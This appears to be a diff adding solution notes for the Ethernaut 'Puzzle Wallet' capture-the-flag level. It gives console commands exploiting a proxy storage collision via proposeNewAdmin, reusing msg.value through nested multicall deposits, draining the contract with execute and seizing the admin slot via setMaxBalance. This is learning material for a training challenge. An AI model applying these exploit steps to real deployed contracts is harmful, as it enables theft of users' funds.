@@ -1,0 +1,49 @@
+Level 24: Puzzle Wallet
+
+functionSignature = {
+    name: 'proposeNewAdmin',
+    type: 'function',
+    inputs: [
+        {
+            type: 'address',
+            name: '_newAdmin'
+        }
+    ]
+}
+
+params = [player]
+
+data = web3.eth.abi.encodeFunctionCall(functionSignature, params)
+
+await web3.eth.sendTransaction({from: player, to: instance, data})
+
+
+await contract.owner() === player
+await contract.addToWhitelist(player)
+await getBalance(contract.address)
+
+
+assembly {
+    selector := mload(add(_data, 32))
+}
+if (selector == this.deposit.selector) {
+    require(!depositCalled, "Deposit can only be called once");
+    // Protect against reusing msg.value
+    depositCalled = true;
+}
+
+
+// deposit() method
+depositData = await contract.methods["deposit()"].request().then(v => v.data)
+
+// multicall() method with param of deposit function call signature
+multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
+
+await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
+
+await contract.execute(player, toWei('0.002'), 0x0)
+
+await getBalance(contract.address)
+
+await contract.setMaxBalance(player)
+
